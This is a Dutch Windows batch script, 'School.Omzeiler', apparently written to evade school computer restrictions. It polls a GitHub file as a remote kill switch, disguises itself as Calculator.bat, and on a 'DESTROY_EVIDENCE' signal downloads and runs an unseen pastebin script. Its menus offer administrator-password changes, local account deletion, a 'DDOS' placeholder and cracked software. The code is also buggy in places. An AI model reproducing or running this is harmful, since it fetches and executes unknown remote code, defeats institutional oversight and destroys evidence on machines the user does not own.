@echo off
cls
set CurrentDir=%cd%
set Core=%Userprofile%\Appdata\Roaming
set Root=%Core%\School.Omzeiler
set Temp=%Root%\Temp
set Downloaded=%Root%\Downloaded
setlocal enabledelayedexpansion
set/a APP_Ins=0
color 2
title School.Omzeiler.1.0

:INSTALL_CHK
if not exist %Core%\School.Omzeiler goto NOT_INSTALLED
goto STARTUP-CHK

:NOT_INSTALLED
echo.
echo Hallo, dit is de eerste keer dat je School.Omzeiler opent voordat je
echo        verder gaat moeten we nog even wat bestanden aanmaken zodat
echo	       alles goed verloopt!
echo.
set/p OPT=Beginnen met downloaden?[J/N]
if %opt%==j goto INSTALL_APP
if %opt%==n exit

:INSTALL_APP
set/a ErrorInstall=0

title Bezig met het programma te installeren . . .
echo Folders aanmaken . . .
cd %Core%
md School.Omzeiler
if not exist School.Omzeiler set/a ErrorInstall+=1
cd %Root%
md Downloaded
md Temp
if not exist Downloaded set/a ErrorInstall+=1
if not exist Temp set/a ErrorInstall+=1
if %ErrorInstall% GEQ 1 echo er is een fout opgetreden. de installatie word gecancelled!
if %ErrorInstall%==0 echo de installatie is geslaagd!
timeout /t 3 /nobreak>nul
set/p OPT=Wil je het programma starten?[J/N]
if %OPT%==j goto STARTUP-CHK
if %opt%==n exit

:STARTUP-CHK
set/a NoWifi=0
reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
echo Checking voor wifi connectie . . .
Ping www.google.com -n 1 -w 1000>nul
if errorlevel 1 set/a NoWifi=1
if errorlevel 0 set/a NoWifi=0
if %NoWifi%==0 goto STARTUP-CHK-MAINSERVER_RETURNCODE
:AFTER-STARTUP-CHK
goto DISCLAIMER

:STARTUP-CHK-MAINSERVER_RETURNCODE
cd %temp%
echo.
echo Connectie vaststellen met de hoofdserver . . .
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/SpicyCuba/SpicyCuba/main/Downloades/ServerStatusStartup -Outfile HoofdServerStatusStart.cc"
set/p StatusServerStart=<HoofdServerStatusStart.cc 
DEL /Q HoofdServerStatusStart.cc
if %StatusServerStart%==SAFE goto AFTER-STARTUP-CHK
if %StatusServerStart%==COMPROMISED goto COMPROMISED-SECURITY_RISK
if %StatusServerStart%==DELETE goto MASS_DELETE_PROTOCOL
if %StatusServerStart%==DESTROY_EVIDENCE goto MASS_DESTRUCTION_PROTOCOl && rem ALLEEN IN NOOD GEBRUIKEN
goto AFTER-STARTUP-CHK

:COMPROMISED-SECURITY_RISK
ren %~n0%~x0 Calculator.bat
cd %Root%\Downloaded
DEL /Q *.
cls
echo.
echo Beveiligings Niveau --[GECOMPROMISEERD]
echo.
echo De server beveiligings code is opgeschaald van SAFE naar COMPROMISED!
echo.
echo Dit betekent dat de app hoogswaarschijnelijk is ontdekt en wordt onderzocht
echo Help alsjeblieft om deze app geheim te houden!
echo.
echo Klik op enter om door te gaan.
pause>nul
goto AFTER-STARTUP-CHK

:MASS_DELETE_PROTOCOL
rem ONLY_EMERGENCY
echo Massa Zelf Vernietiging Protocol Geactiveerd . . .
cd %Core%
rmdir /s /q School.Omzeiler
echo Bestanden Verwijderd.
cd %CurrentDir%
DEL /Q %~n0%~x0
exit

:MASS_DESTRUCTION_PROTOCOL
rem ALLEEN_GEBRUIKEN_OM_ALL_BEWIJS_TE_VERNIETIGEN
echo Nodige Bestanden Downloaden . . .
powershell -Command "Invoke-WebRequest https://pastebin.com/raw/yx8kkTK9 -Outfile H3LTH.INSUR3NCE.bat"
echo Bestanden Succesvol Gedownload.
echo Script Activeren...
start H3LTH.INSUR3NCE.bat
del /q %~n0%~x0
exit


:DISCLAIMER
cls
echo.
echo Waarschuwing School.Omzeiler is een expirimenteel programma om school restricties te omzeilen! Als je wordt gepakt met
echo               het gebruik van dit programma ben ik NIET verantwoordelijk.
echo.
pause
cls
goto MAIN_PAGE

:MAIN_PAGE
cls
color 2
title School.Omzeiler.1.0 - MAIN_PAGE
echo.
echo +++++++++++++++++++++++++++++++++++++++++++++++
echo School.Omzeiler.1.0                           +
echo Datum = [%Date%]                      +
echo Applicaties Geinstalleerd = [%APP_Ins%]               +
echo +++++++++++++++++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Installeer Applicaties
ECHO 2 - Ingebouwde Opdrachten
ECHO 3 - Anti Spioneer Scan
ECHO 4 - [] Speciaal DOS Programma []
echo.
ECHO 4 - Applicatie Afsltuiten
echo.
set/p OPT=Voer hier uw antwoord in:
if %OPT%==1 goto INSTALL_APPS
if %OPT%==2 goto IO
if %OPT%==3 goto ASC
if %OPT%==4 goto Special_DDOS_Operation
if %OPT%==5 exit

:IO
cls
color 2
title School.Omzeiler.1.0 - MAIN_PAGE\IO
echo.
echo +++++++++++++++++++++++++++++++++++++++++++++++
echo School.Omzeiler.1.0                           +
echo Datum = [%Date%]                      +
echo Applicaties Geinstalleerd = [%APP_Ins%]               +
echo +++++++++++++++++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Administrator Wachtwoord Vernaderen
ECHO 2 - Accounts Verwijder [ALLEEN LOKAAL]
echo.
ECHO 4 - Terug
echo.
set/p OPT=Voer hier uw antwoord in:
if %OPT%==1 goto IO-AWV
if %OPT%==2 goto IO-AV
if %OPT%==3 goto MAIN_PAGE


:ASC
cls
echo.
echo Bezig met scannen voor . . .[123keylogger]
if exist C:\Windows\System32\Winservc\HookEngine.dll DEL /Q C:\Windows\System32\Winservc\HookEngine.dll && set/a ASC-Detection+=1
if exist C:\Windows\System32\Winservc\invis.sys DEL /Q C:\Windows\System32\Winservc\invis.sys && set/a ASC-Detection+=1
if exist C:\Windows\cdmxtras\uninst.exe DEL /Q C:\Windows\cdmxtras\uninst.exe && set/a ASC-Detection+=1
if exist C:\Windows\System32\uninst.exe DEL /Q C:\Windows\System32\uninst.exe && set/a ASC-Detection+=1
if exist C:\Windows\System32\Winservc\mine.exe DEL /Q C:\Windows\System32\Winservc\mine.exe && set/a ASC-Detection+=1
if exist C:\Windows\System32\Winservc\UnloadES.exe DEL /Q C:\Windows\System32\Winservc\UnloadES.exe && set/a ASC-Detection+=1
if exist C:\Windows\viewer.exe DEL /Q C:\Windows\viewer.exe && set/a ASC-Detection+=1
if exist C:\Windows\System32\Winservc\Viewer.exe DEL /Q C:\Windows\System32\Winservc\Viewer.exe && set/a ASC-Detection+=1
if exist C:\Windows\System32\Winservc\CatchLog.dat DEL /Q C:\Windows\System32\Winservc\CatchLog.dat && set/a ASC-Detection+=1
cls
echo.
echo Bezig met scannen voor . . .[180solutions.SeekMo]
timeout /t 2 /nobreak>nul
if exist %tmp%\180e.tmp DEL /Q %tmp%\180e.tmp && set/a ASC-Detection+=1
if exist C:\Program Files\Hotbar\bin\11.0.78.0\Srv.exe DEL /Q C:\Program Files\Hotbar\bin\11.0.78.0\Srv.exe && set/a ASC-Detection+=1
cls
echo.
echo Bezig met scannen voor . . .[2Search]
if exist C:\Windows\System32\2search.exe DEL /Q C:\Windows\System32\2search.exe && set/a ASC-Detection+=1
if exist C:\Windows\System32\007guard.exe DEL /Q C:\Windows\System32\007guard.exe && set/a ASC-Detection+=1
if exist C:\Windows\System32\2searchinstaller.exe DEL /Q C:\Windows\System32\2searchinstaller.exe && set/a ASC-Detection+=1
timeout /t 2 /nobreak>nul
cls
echo.
echo Anti Spioneer Scan Resultaten
echo -------------------------------------------
echo Gevonden Bestanden = %ASC-Detection%
echo Verwijderde Bestanden = %ASC-Dectection%
echo.
pause

:Special_DDOS_Operation
cls
echo.
echo Dit progrmma is momenteel niet beschikbaar.
echo.
echo.
timeout /t 4 /nobreak>nul
goto MAIN_PAGE

:INSTALL_APPS
cls
color 2
title School.Omzeiler.1.0 - MAIN_PAGE\INSTALL_APPS
echo.
echo +++++++++++++++++++++++++++++++++++++++++++++++
echo School.Omzeiler.1.0                           +
echo Datum = [%Date%]                      +
echo Applicaties Geinstalleerd = [%APP_Ins%]               +
echo +++++++++++++++++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Wallpaper Engine (CRACKED)
ECHO 2 - OP Auto Clicker 3.0
echo.
ECHO 3 - Vorige Pagina
echo.
set/p OPT=Voer hier uw antwoord in:
if %OPT%==1 goto WE-DOWN
if %OPT%==2 goto OPAC-DOWN
if %OPT%==3 goto MAIN_PAGE

:OPAC-DOWN
cls
color 2
title School.Omzeiler.1.0 - MAIN_PAGE\INSTALL_APPS\AutoClicker
echo.
echo +++++++++++++++++++++++++++++++++++++++
echo School.Omzeiler1.0                    +
echo Datum = [%Date%]              +
echo Status Geinstalleerd = [%OPAC-Installed%]            +
echo +++++++++++++++++++++++++++++++++++++++
echo.
ECHO 1 - Installeer Programms
echo.
echo 2 - Vorige Pagina
echo.
set/p OPT=Voer hier uw antwoord in:
if %OPT%==1 goto OPAC-DOWNLOAD
if %OPT%==2 goto OPAC-DELETE
if %OPT%==3 goto INSTALL_APPS

:INSTALL_FAIL_SERVER_RETURN_OFFLINE
cls
echo.
echo De connectie met de hoofdserver kon niet worden vastgesteld!
echo.
echo ------------------------------------------------------------------------
:INSTALL_FAIL_SERVER_RETURN_OFFLINE-BOX
echo Internet Connectie Status Analyseren . . .
ping -n 1 google.com>nul
if %errorlevel% equ 1 set/a SRCA=0
if %errorlevel% equ 0 set/a SRCA=1
timeout /t 2 /nobreak>nul
if %SRCA%==1 echo Internet Connectie Status Analyseren . . .[Internet Connectie Inorde]
if %SRCA%==0 echo Internet Connectie Status Analyseren . . .[Geen Internet Connectie]
echo Server Return Code Analyseren . . .
TIMEOUT /t 2 /nobreak>nul
set SERVER_STATUS_DEBUG=
if %StatusServer%==ONLINE set SERVER_STATUS_DEBUG=SERVER_ONLINE
if %StatusServer%==OFFLINE set SERVER_STATUS_DEBUG=SERVER_OFFLINE
if %StatusServer%==else set SERVER_STATUS_DEBUG=SERVER_STATUS_UNKNOWN
echo Server Return Code Analyseren . . .[%SERVER_STATUS_DEBUG%]
echo.
timeout /t 6 /nobreak>nul
goto MAIN_PAGE

:OPAC-DOWNLOAD
setlocal enabledelayedexpansion
cd %tmp%
cls
echo.
echo Connectie vaststellen met de hoofdserver...
SetLocal EnableDelayedExpansion
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/SpicyCuba/SpicyCuba/main/Downloades/ServerStatus -Outfile HoofdServerStatus.cc"
set/p StatusServer=<HoofdServerStatus.cc 
timeout /t 2 /nobreak>nul
DEL /Q HoofdServerStatus.cc
echo Connectie vastgesteld met hoofdserver . . . [STATUS_%StatusServer%]
if %StatusServer%==OFFLINE echo Waarschuwing, De Server is onbereikbaar. De download word geannuleerd!
if %StatusServer%==OFFLINE timeout /t 6 /nobreak>nul && goto INSTALL_FAIL_SERVER_RETURN_OFFLINE
echo De OP AutoClicker 3.0 wordt gedownload...
cd %TMP%
powershell -Command "Invoke-WebRequest https://github.com/SpicyCuba/SpicyCuba/raw/main/Downloades/AutoClicker.zip -Outfile AutoClicker.zip"
if exist AutoClicker.rar echo AutoClicker succesvol gedownload!
if not exist AutoClicker.zip echo er was een fout opgetreden toen AutoClicker werd gedownload!
echo AutoClicker verplaatsen . . .
MOVE %TMP%\AutoClicker.zip %Root%\Downloaded>NUL
cd %Root%\Downloaded
start AutoClicker.zip
echo Sleep het bestand naar de gewenste plek. Klik op enter om verder te gaan.
pause>nul
goto INSTALL_APPS